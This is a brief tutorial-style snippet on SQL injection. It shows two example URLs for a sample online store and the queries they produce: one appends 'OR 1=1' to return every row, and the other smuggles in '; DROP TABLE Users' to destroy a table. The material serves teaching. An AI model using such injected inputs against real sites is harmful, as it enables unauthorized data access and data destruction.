## SQL Injection Attacks:
```sql
-- http://www.estore.com/items/iteams.asp?itemid=999 OR 1=1
-- 1=1 always evalulates to true
SELECT ItemName, ItemDescription
FROM Items
WHERE ItemNumber = 999 OR 1=1

-- http://www.estore.com/items/iteams.asp?itemid=999; DROP TABLE Users
SELECT ItemName, ItemDescription
FROM Items
WHERE ItemNumber = 999; DROP TABLE USERS
```
